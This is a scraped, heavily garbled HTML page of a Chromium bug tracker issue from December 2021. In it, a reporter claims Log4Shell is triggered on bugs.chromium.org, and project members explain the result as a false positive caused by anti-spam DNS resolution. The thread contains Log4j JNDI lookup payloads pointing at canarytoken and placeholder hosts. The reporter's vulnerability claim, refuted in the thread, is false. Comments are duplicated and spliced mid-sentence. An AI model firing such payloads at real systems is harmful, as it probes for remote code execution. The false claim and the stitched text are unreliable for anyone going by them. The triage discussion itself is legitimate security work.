        I've noticed that, when attempting to reproduce this with canarytoken, none of the hits on<span class="line"><!---->I've noticed that, when attempting to reproduce this with canarytoken, none of the hits on<!----></span> <span class="line"><!----> <!----></span>bugs.chromium.org<a class="undefined" target="_blank" href="https://bugs.chromium.org"><!---->bugs.chromium.org<!----></a> are showing a `log4_shell_computer_name`. I was able to reproduce this by attempting running `dig L4J.<mytoken>.canarytokens.com`.<span class="line"><!----> are showing a `log4_shell_computer_name`. I was able to reproduce this by attempting running `dig L4J.&lt;mytoken&gt;.canarytokens.com`.<!----></span><br><br>In cases where a subdomain is provided, eg. `dig xtest.L4J.<mytoken>.canarytokens.com` it produces a `log4_shell_computer_name` of `test`. This seems to indicate that x${hostname} is being ignored, which may lend credence to the theory that something is scanning for hostnames in comment content and resolving those (eg. for spam detection purposes).<span class="line"><!---->In cases where a subdomain is provided, eg. `dig xtest.L4J.&lt;mytoken&gt;.canarytokens.com` it produces a `log4_shell_computer_name` of `test`. This seems to indicate that x${hostname} is being ignored, which may lend credence to the theory that something is scanning for hostnames in comment content and resolving those (eg. for spam detection purposes).<!----></span><br><br>I'll also note that this is not reproducible on the staging instance of<span class="line"><!---->I'll also note that this is not reproducible on the staging instance of<!----></span> <span class="line"><!----> <!----></span>bugs.chromium.org<a class="undefined" target="_blank" href="https://bugs.chromium.org"><!---->bugs.chromium.org<!----></a>, which may indicate that the resolution is happening somewhere downstream of our service. eg. a pipeline that is consuming comment data from our prod instance.<span class="line"><!---->, which may indicate that the resolution is happening somewhere downstream of our service. eg. a pipeline that is consuming comment data from our prod instance.<!----></span><mr-comment-content></mr-comment-content>

        My interpretation is that if the interpolation of ${hostname} is not being included in the DNS query, Log4J shell is not being invoked. Is that the correct mental model?<span class="line"><!---->My interpretation is that if the interpolation of ${hostname} is not being included in the DNS query, Log4J shell is not being invoked. Is that the correct mental model?<!----></span><br><br>We've also verified that for issues which are marked Restrict-View-Nobody, there is no hit to canary token, which further confirms that a downstream service is doing the resolution.<span class="line"><!---->We've also verified that for issues which are marked Restrict-View-Nobody, there is no hit to canary token, which further confirms that a downstream service is doing the resolution.<!----></span><mr-comment-content></mr-comment-content>

        Hi Team,<span class="line"><!---->Hi Team,<!----></span><br><br>We can see that we are using the Log4j Payloads with ${jndi:ldap://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/a} or this * `${jndi:rmi://${lower:interpolated123<span class="line"><!---->We can see that we are using the Log4j Payloads with ${jndi:ldap://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/a} or this * `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<a class="undefined" target="_blank" href="https://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`"><!---->hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<!----></a> format payload is getting triggered which means application is not applying protection for Log4j payloads on comment and it is exposing internal IP's.<span class="line"><!----> format payload is getting triggered which means application is not applying protection for Log4j payloads on comment and it is exposing internal IP's.<!----></span><br><br>Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<span class="line"><!---->Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<!----></span><br><br>I can confirm from other companies that those who have started protection against Log4j shell are not allowing to put these above payloads as well on the system.<span class="line"><!---->I can confirm from other companies that those who have started protection against Log4j shell are not allowing to put these above payloads as well on the system.<!----></span><br><br>First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<span class="line"><!---->First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<!----></span><br><br>While putting the comment there is an communication happening with the server and that is why payload is getting triggered and providing the IP's.<span class="line"><!---->While putting the comment there is an communication happening with the server and that is why payload is getting triggered and providing the IP's.<!----></span><mr-comment-content></mr-comment-content>

        > First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<span class="line"><!---->&gt; First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<!----></span><br><br>I'm not sure this is the case. I think it's more likely that Monorail is ignoring everything that doesn't look like a URL. From my understanding to prove that this is actually going through a log4jshell is if the `log4_shell_computer_name` was present with values that could only have been supplied by Log4J interpolation as described in <span class="line"><!----> in a bug (a token of my own making).         Hi aishwary.tripathi.295@, thanks for this report.<span class="line"><!---->Hi aishwary.tripathi.295@, thanks for this report.<!----></span><br><br>There's nothing to fix here.<span class="line"><!---->There's nothing to fix here.<!----></span><br><br>What's happening is that aspects of the Chromium infrastructure are spotting the DNS names within your payloads and are resolving them for various reasons. As you say, this exposes internal IPs but that's not a concern.<span class="line"><!---->What's happening is that aspects of the Chromium infrastructure are spotting the DNS names within your payloads and are resolving them for various reasons. As you say, this exposes internal IPs but that's not a concern.<!----></span><br><br>There is no log4j interpolation happening here. You've proved that yourself. With the payload:<span class="line"><!---->There is no log4j interpolation happening here. You've proved that yourself. With the payload:<!----></span><br>  `${jndi:rmi://${lower:interpolated123<span class="line"><!---->  `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<a class="undefined" target="_blank" href="https://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`"><!---->hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<!----></a> <span class="line"><!----> <!----></span><br><br>you saw a hit on the canarytoken<span class="line"><!---->you saw a hit on the canarytoken<!----></span><br> <span class="line"><!----> <!----></span> <span class="line"><!----> <!----></span>hwr90n7ver9ok5jbl0btktyim.canarytokens.com<a class="undefined" target="_blank" href="https://hwr90n7ver9ok5jbl0btktyim.canarytokens.com"><!---->hwr90n7ver9ok5jbl0btktyim.canarytokens.com<!----></a><br><br>If log4j interpolation was happening, our infrastructure would instead have requested<span class="line"><!---->If log4j interpolation was happening, our infrastructure would instead have requested<!----></span><br> <span class="line"><!----> <!----></span> <span class="line"><!----> <!----></span>interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com<a class="undefined" target="_blank" href="https://interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com"><!---->interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com<!----></a><br><br>You state:<span class="line"><!---->You state:<!----></span><br>> Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<span class="line"><!---->&gt; Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<!----></span><br><br>That's not correct. The log4j bug is, of course, only exploitable if log4j is interpreting that payload. That log4j interpretation code would be the code which fetches remote code to arrange a shell, or in the simple example above, interpolates 'interpolated123'. Those things aren't happening and can't happen because log4j is not interpreting this payload, and no other code is interpreting it according to log4j rules, so there's no way an attacker can exploit this.<span class="line"><!---->That's not correct. The log4j bug is, of course, only exploitable if log4j is interpreting that payload. That log4j interpretation code would be the code which fetches remote code to arrange a shell, or in the simple example above, interpolates 'interpolated123'. Those things aren't happening and can't happen because log4j is not interpreting this payload, and no other code is interpreting it according to log4j rules, so there's no way an attacker can exploit this.<!----></span><br><br>Thanks again for the report and please don't hestitate to report other vulnerabilities in Chromium or its infrastructure, we appreciate it.<span class="line"><!---->Thanks again for the report and please don't hestitate to report other vulnerabilities in Chromium or its infrastructure, we appreciate it.<!----></span><mr-comment-content></mr-comment-content>

        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      <option value="0" selected="">
        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    <!---->
        </select>
      <div class="select-container">
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    <!---->
        </select>
      </div>
      Hi Team,<span class="line"><!---->Hi Team,<!----></span><br><br>I have successfully found that Chrome Web Application is vulnerable to Log4j Shell. The Log4j Shell is getting triggered on Chrome's Bug reporting site.<span class="line"><!---->I have successfully found that Chrome Web Application is vulnerable to Log4j Shell. The Log4j Shell is getting triggered on Chrome's Bug reporting site.<!----></span><br><br>I have inserted the payload and payload instructs the vulnerable application to connect to an attacker-controlled LDAP server via the JNDI API<span class="line"><!---->I have inserted the payload and payload instructs the vulnerable application to connect to an attacker-controlled LDAP server via the JNDI API<!----></span><br><br>The Log4j shell is successfully Getting Triggered. Please Go through the POC.<span class="line"><!---->The Log4j shell is successfully Getting Triggered. Please Go through the POC.<!----></span><br><br>Logging untrusted or user-controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data provided in logged errors such as exception traces, authentication failures, and other unexpected vectors of user-controlled input.<span class="line"><!---->Logging untrusted or user-controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data provided in logged errors such as exception traces, authentication failures, and other unexpected vectors of user-controlled input.<!----></span><br><br>Repro Steps<span class="line"><!---->Repro Steps<!----></span><br>1. Go to <span class="line"><!---->1. Go to <!----></span>https://canarytokens.org/<a class="undefined" target="_blank" href="https://canarytokens.org/"><!---->https://canarytokens.org/<!----></a> and Generate Log4j Shell Token and then click manage this token<span class="line"><!----> and Generate Log4j Shell Token and then click manage this token<!----></span><br>2. To test the Log4j in Application put the token in command like this - ${jndi:ldap://x${hostName}.L4J.rh2z92aan2x5rgo3mxvbbz262.canarytokens.com/a} in which hostname will your controlled server<span class="line"><!---->2. To test the Log4j in Application put the token in command like this - ${jndi:ldap://x${hostName}.L4J.rh2z92aan2x5rgo3mxvbbz262.canarytokens.com/a} in which hostname will your controlled server<!----></span><br>3. Go to browser and open <span class="line"><!---->3. Go to browser and open <!----></span>https://bugs.chromium.org/p/chromium/issues/listand<a class="undefined" target="_blank" href="https://bugs.chromium.org/p/chromium/issues/listand"><!---->https://bugs.chromium.org/p/chromium/issues/listand<!----></a> go to any issue number and in comment section put the payload. In comment put this payload to test the application is vulnerable to Log4j or not.<span class="line"><!----> go to any issue number and in comment section put the payload. In comment put this payload to test the application is vulnerable to Log4j or not.<!----></span><br>4. The Shell is getting triggered on both occasion when you are creating the issue or when you are commenting on someone else's issue.<span class="line"><!---->4. The Shell is getting triggered on both occasion when you are creating the issue or when you are commenting on someone else's issue.<!----></span><br><br>You will get notification on mail for Log4j Shell Triggered and also on <span class="line"><!---->You will get notification on mail for Log4j Shell Triggered and also on <!----></span>https://canarytokens.org/<a class="undefined" target="_blank" href="https://canarytokens.org/"><!---->https://canarytokens.org/<!----></a> as shown in POC.<span class="line"><!----> as shown in POC.<!----></span><br><br>It is showing Chrome Web Application is vulnerable to Log4j<span class="line"><!---->It is showing Chrome Web Application is vulnerable to Log4j<!----></span><mr-comment-content></mr-comment-content>

        This site is written in Python and therefore is not subject to CVE-2021-44228. What is likely happening is that the domain is being resolved (but no code execution is happening), so this is simply a false positive. +pawalls@ for confirmation.<span class="line"><!---->This site is written in Python and therefore is not subject to CVE-2021-44228. What is likely happening is that the domain is being resolved (but no code execution is happening), so this is simply a false positive. +pawalls@ for confirmation.<!----></span><mr-comment-content></mr-comment-content>

          <a class="comment-link" href="?id=1279979#c5">Comment 5<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Dec 14, 2021, 6:25 PM EST"></chops-timestamp>
        
          <span class="role-label">Project Member</span>

        Our systems often scan for hostnames and URLs in various user inputs (e.g. chat messages, emails), resolve them via DNS, and try to fetch the URLs, for example to determine if the payload is malicious, or whether the message itself should be classified as spam. We think this is what happened here.<span class="line"><!---->Our systems often scan for hostnames and URLs in various user inputs (e.g. chat messages, emails), resolve them via DNS, and try to fetch the URLs, for example to determine if the payload is malicious, or whether the message itself should be classified as spam. We think this is what happened here.<!----></span><br><br>If you think we made a mistake here, and you have sufficient evidence that a Log4Shell vulnerability is actually triggered by the way you describe, you can try the following: Modify the payload, such that the literal payload does not contain the full hostname, but that the hostname is created by the Log4J interpolation. For example:<span class="line"><!---->If you think we made a mistake here, and you have sufficient evidence that a Log4Shell vulnerability is actually triggered by the way you describe, you can try the following: Modify the payload, such that the literal payload does not contain the full hostname, but that the hostname is created by the Log4J interpolation. For example:<!----></span><br><br>* `${jndi:rmi://${lower:interpolated123<span class="line"><!---->* `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>foo.bar.com/baz}`<a class="undefined" target="_blank" href="https://foo.bar.com/baz}`"><!---->foo.bar.com/baz}`<!----></a><br>* `${jndi:ldap://${lower:interpolated123<span class="line"><!---->* `${jndi:ldap://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>foo.bar.com/baz}`<a class="undefined" target="_blank" href="https://foo.bar.com/baz}`"><!---->foo.bar.com/baz}`<!----></a><br><br>These payloads are constructed in such a way, that the systems that don't understand Log4J interpolation syntax, and have nothing to do with Log4Shell vulnerability, would see only <span class="line"><!---->These payloads are constructed in such a way, that the systems that don't understand Log4J interpolation syntax, and have nothing to do with Log4Shell vulnerability, would see only <!----></span>`<span class="line"><!---->`<!----></span>foo.bar.com/baz`<a class="undefined" target="_blank" href="https://foo.bar.com/baz`"><!---->foo.bar.com/baz`<!----></a>,<span class="line"><!---->,<!----></span> but systems with Log4J would try to resolve <span class="line"><!----> but systems with Log4J would try to resolve <!----></span>`<span class="line"><!---->`<!----></span>interpolated123foo.bar.com<a class="undefined" target="_blank" href="https://interpolated123foo.bar.com"><!---->interpolated123foo.bar.com<!----></a>` and send the request to <span class="line"><!---->` and send the request to <!----></span>`<span class="line"><!---->`<!----></span>interpolated123foo.bar.com/baz`<a class="undefined" target="_blank" href="https://interpolated123foo.bar.com/baz`"><!---->interpolated123foo.bar.com/baz`<!----></a>.<span class="line"><!---->.<!----></span><br><br>In other words, such payload allows you to scan our services with much bigger confidence that you're catching actual Log4Shell, and not random ways that our services use to connect to external services for e.g. anti-spam purposes.<span class="line"><!---->In other words, such payload allows you to scan our services with much bigger confidence that you're catching actual Log4Shell, and not random ways that our services use to connect to external services for e.g. anti-spam purposes.<!----></span><br><br>If by using the above method you can confirm what looks like actual Log4Shell bug, please just update this report with your finding.<span class="line"><!---->If by using the above method you can confirm what looks like actual Log4Shell bug, please just update this report with your finding.<!----></span><mr-comment-content></mr-comment-content>

        I've noticed that, when attempting to reproduce this with canarytoken, none of the hits on<span class="line"><!---->I've noticed that, when attempting to reproduce this with canarytoken, none of the hits on<!----></span> <span class="line"><!----> <!----></span>bugs.chromium.org<a class="undefined" target="_blank" href="https://bugs.chromium.org"><!---->bugs.chromium.org<!----></a> are showing a `log4_shell_computer_name`. I was able to reproduce this by attempting running `dig L4J.<mytoken>.canarytokens.com`.<span class="line"><!----> are showing a `log4_shell_computer_name`. I was able to reproduce this by attempting running `dig L4J.&lt;mytoken&gt;.canarytokens.com`.<!----></span><br><br>In cases where a subdomain is provided, eg. `dig xtest.L4J.<mytoken>.canarytokens.com` it produces a `log4_shell_computer_name` of `test`. This seems to indicate that x${hostname} is being ignored, which may lend credence to the theory that something is scanning for hostnames in comment content and resolving those (eg. for spam detection purposes).<span class="line"><!---->In cases where a subdomain is provided, eg. `dig xtest.L4J.&lt;mytoken&gt;.canarytokens.com` it produces a `log4_shell_computer_name` of `test`.         Hi Team,<span class="line"><!---->Hi Team,<!----></span><br><br>We can see that we are using the Log4j Payloads with ${jndi:ldap://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/a} or this * `${jndi:rmi://${lower:interpolated123<span class="line"><!---->We can see that we are using the Log4j Payloads with ${jndi:ldap://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/a} or this * applying protection for Log4j payloads on comment and it is exposing internal IP's.<span class="line"><!----> format payload is getting triggered which means application is not applying protection for Log4j payloads on comment and it is exposing internal IP's.<!----></span><br><br>Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the allowing to put these above payloads as well on the system.<span class="line"><!---->I can confirm from other companies that those who have started protection against Log4j shell are not allowing to put these above payloads as well on the system.<!----></span><br><br>First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<span class="line"><!---->First of all         Hi aishwary.tripathi.295@, thanks for this report.<span class="line"><!---->Hi aishwary.tripathi.295@, thanks for this report.<!----></span><br><br>There's nothing to fix here.<span class="line"><!---->There's nothing to fix here.<!----></span><br><br>What's happening is that aspects of the Chromium infrastructure are spotting the DNS names within your payloads and are resolving them for various reasons. As you say, this exposes internal IPs but that's not a concern.<span class="line"><!---->What's happening is that aspects of the Chromium infrastructure are spotting the DNS names within your payloads and are resolving them for various reasons. As you say, this exposes internal IPs but that's not a concern.<!----></span><br><br>There is no log4j interpolation happening here. You've proved that yourself. With the payload:<span class="line"><!---->There is no log4j interpolation happening here. You've proved that yourself. With the payload:<!----></span><br>  `${jndi:rmi://${lower:interpolated123<span class="line"><!---->  `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<a class="undefined" target="_blank" href="https://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`"><!---->hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<!----></a> <span class="line"><!----> <!----></span><br><br>you saw a hit on the canarytoken<span class="line"><!---->you saw a hit on the canarytoken<!----></span><br> <span class="line"><!----> <!----></span> <span class="line"><!----> <!----></span>hwr90n7ver9ok5jbl0btktyim.canarytokens.com<a class="undefined" target="_blank" href="https://hwr90n7ver9ok5jbl0btktyim.canarytokens.com"><!---->hwr90n7ver9ok5jbl0btktyim.canarytokens.com<!----></a><br><br>If log4j interpolation was happening, our infrastructure would instead have requested<span class="line"><!---->If log4j interpolation was happening, our infrastructure would instead have requested<!----></span><br> <span class="line"><!----> <!----></span> <span class="line"><!----> <!----></span>interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com<a class="undefined" target="_blank" href="https://interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com"><!---->interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com<!----></a><br><br>You state:<span class="line"><!---->You state:<!----></span><br>> Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<span class="line"><!---->&gt; Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<!----></span><br><br>That's not correct. The log4j bug is, of course, only exploitable if log4j is interpreting that payload. That log4j interpretation code would be the code which fetches remote code to arrange a shell, or in the simple example above, interpolates 'interpolated123'. Those things aren't happening and can't happen because log4j is not interpreting this payload, and no other code is interpreting it according to log4j rules, so there's no way an attacker can exploit this.<span class="line"><!---->That's not correct. The log4j bug is, of course, only exploitable if log4j is interpreting that payload. That log4j interpretation code would be the code which fetches remote code to arrange a shell, or in the simple example above, interpolates 'interpolated123'. Those things aren't happening and can't happen because log4j is not interpreting this payload, and no other code is interpreting it according to log4j rules, so there's no way an attacker can exploit this.<!----></span><br><br>Thanks again for the report and please don't hestitate to report other vulnerabilities in Chromium or its infrastructure, we appreciate it.<span class="line"><!---->Thanks again for the report and please don't hestitate to report other vulnerabilities in Chromium or its infrastructure, we appreciate it.<!----></span><mr-comment-content></mr-comment-content>

            Issue 1279979: Security: Log4j Shell Getting Triggered (CVE-2021-44228)
          <h1>
            
            Issue 1279979: Security: Log4j Shell Getting Triggered (CVE-2021-44228)
          </h1>
          
            Reported by

        Description #1 by aishw...@gmail.com (Dec 14, 2021)

      <div class="select-container">
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    <!---->
        </select>
      </div>
      Hi Team,<span class="line"><!---->Hi Team,<!----></span><br><br>I have successfully found that Chrome Web Application is vulnerable to Log4j Shell. The Log4j Shell is getting triggered on Chrome's Bug reporting site.<span class="line"><!---->I have successfully found that Chrome Web Application is vulnerable to Log4j Shell. The Log4j Shell is getting triggered on Chrome's Bug reporting site.<!----></span><br><br>I have inserted the payload and payload instructs the vulnerable application to connect to an attacker-controlled LDAP server via the JNDI API<span class="line"><!---->I have inserted the payload and payload instructs the vulnerable application to connect to an attacker-controlled LDAP server via the JNDI API<!----></span><br><br>The Log4j shell is successfully Getting Triggered. Please Go through the POC.<span class="line"><!---->The Log4j shell is successfully Getting Triggered. Please Go through the POC.<!----></span><br><br>Logging untrusted or user-controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data provided in logged errors such as exception traces, authentication failures, and other unexpected vectors of user-controlled input.<span class="line"><!---->Logging untrusted or user-controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data provided in logged errors such as exception traces, authentication failures, and other unexpected vectors of user-controlled input.<!----></span><br><br>Repro Steps<span class="line"><!---->Repro Steps<!----></span><br>1. Go to <span class="line"><!---->1. Go to <!----></span>https://canarytokens.org/<a class="undefined" target="_blank" href="https://canarytokens.org/"><!---->https://canarytokens.org/<!----></a> and Generate Log4j Shell Token and then click manage this token<span class="line"><!----> and Generate Log4j Shell Token and then click manage this token<!----></span><br>2. To test the Log4j in Application put the token in command like this - ${jndi:ldap://x${hostName}.L4J.rh2z92aan2x5rgo3mxvbbz262.canarytokens.com/a} in which hostname will your controlled server<span class="line"><!---->2. To test the Log4j in Application put the token in command like this - ${jndi:ldap://x${hostName}.L4J.rh2z92aan2x5rgo3mxvbbz262.canarytokens.com/a} in which hostname will your controlled server<!----></span><br>3. Go to browser and open <span class="line"><!---->3. Go to browser and open <!----></span>https://bugs.chromium.org/p/chromium/issues/listand<a class="undefined" target="_blank" href="https://bugs.chromium.org/p/chromium/issues/listand"><!---->https://bugs.chromium.org/p/chromium/issues/listand<!----></a> go to any issue number and in comment section put the payload. In comment put this payload to test the application is vulnerable to Log4j or not.<span class="line"><!----> go to any issue number and in comment section put the payload. In comment put this payload to test the application is vulnerable to Log4j or not.<!----></span><br>4. The Shell is getting triggered on both occasion when you are creating the issue or when you are commenting on someone else's issue.<span class="line"><!---->4. The Shell is getting triggered on both occasion when you are creating the issue or when you are commenting on someone else's issue.<!----></span><br><br>You will get notification on mail for Log4j Shell Triggered and also on <span class="line"><!---->You will get notification on mail for Log4j Shell Triggered and also on <!----></span>https://canarytokens.org/<a class="undefined" target="_blank" href="https://canarytokens.org/"><!---->https://canarytokens.org/<!----></a> as shown in POC.<span class="line"><!----> as shown in POC.<!----></span><br><br>It is showing Chrome Web Application is vulnerable to Log4j<span class="line"><!---->It is showing Chrome Web Application is vulnerable to Log4j<!----></span><mr-comment-content></mr-comment-content>

        This site is written in Python and therefore is not subject to CVE-2021-44228. What is likely happening is that the domain is being resolved (but no code execution is happening), so this is simply a false positive. +pawalls@ for confirmation.<span class="line"><!---->This site is written in Python and therefore is not subject to CVE-2021-44228. What is likely happening is that the domain is being resolved (but no code execution is happening), so this is simply a false positive. +pawalls@ for confirmation.<!----></span><mr-comment-content></mr-comment-content>

        by

          <a class="comment-link" href="?id=1279979#c5">Comment 5<!----></a>

          
        by
        <mr-user-link></mr-user-link>

        Our systems often scan for hostnames and URLs in various user inputs (e.g. chat messages, emails), resolve them via DNS, and try to fetch the URLs, for example to determine if the payload is malicious, or whether the message itself should be classified as spam. We think this is what happened here.<span class="line"><!---->Our systems often scan for hostnames and URLs in various user inputs (e.g. chat messages, emails), resolve them via DNS, and try to fetch the URLs, for example to determine if the payload is malicious, or whether the message itself should be classified as spam. We think this is what happened here.<!----></span><br><br>If you think we made a mistake here, and you have sufficient evidence that a Log4Shell vulnerability is actually triggered by the way you describe, you can try the following: Modify the payload, such that the literal payload does not contain the full hostname, but that the hostname is created by the Log4J interpolation. For example:<span class="line"><!---->If you think we made a mistake here, and you have sufficient evidence that a Log4Shell vulnerability is actually triggered by the way you describe, you can try the following: Modify the payload, such that the literal payload does not contain the full hostname, but that the hostname is created by the Log4J interpolation. For example:<!----></span><br><br>* `${jndi:rmi://${lower:interpolated123<span class="line"><!---->* `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>foo.bar.com/baz}`<a class="undefined" target="_blank" href="https://foo.bar.com/baz}`"><!---->foo.bar.com/baz}`<!----></a><br>* `${jndi:ldap://${lower:interpolated123<span class="line"><!---->* `${jndi:ldap://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>foo.bar.com/baz}`<a class="undefined" target="_blank" href="https://foo.bar.com/baz}`"><!---->foo.bar.com/baz}`<!----></a><br><br>These payloads are constructed in such a way, that the systems that don't understand Log4J interpolation syntax, and have nothing to do with Log4Shell vulnerability, would see only <span class="line"><!---->These payloads are constructed in such a way, that the systems that don't understand Log4J interpolation syntax, and have nothing to do with Log4Shell vulnerability, would see only <!----></span>`<span class="line"><!---->`<!----></span>foo.bar.com/baz`<a class="undefined" target="_blank" href="https://foo.bar.com/baz`"><!---->foo.bar.com/baz`<!----></a>,<span class="line"><!---->,<!----></span> but systems with Log4J would try to resolve <span class="line"><!----> but systems with Log4J would try to resolve <!----></span>`<span class="line"><!---->`<!----></span>interpolated123foo.bar.com<a class="undefined" target="_blank" href="https://interpolated123foo.bar.com"><!---->interpolated123foo.bar.com<!----></a>` and send the request to <span class="line"><!---->` and send the request to <!----></span>`<span class="line"><!---->`<!----></span>interpolated123foo.bar.com/baz`<a class="undefined" target="_blank" href="https://interpolated123foo.bar.com/baz`"><!---->interpolated123foo.bar.com/baz`<!----></a>.<span class="line"><!---->.<!----></span><br><br>In other words, such payload allows you to scan our services with much bigger confidence that you're catching actual Log4Shell, and not random ways that our services use to connect to external services for e.g. anti-spam purposes.<span class="line"><!---->In other words, such payload allows you to scan our services with much bigger confidence that you're catching actual Log4Shell, and not random ways that our services use to connect to external services for e.g. anti-spam purposes.<!----></span><br><br>If by using the above method you can confirm what looks like actual Log4Shell bug, please just update this report with your finding.<span class="line"><!---->If by using the above method you can confirm what looks like actual Log4Shell bug, please just update this report with your finding.<!----></span><mr-comment-content></mr-comment-content>
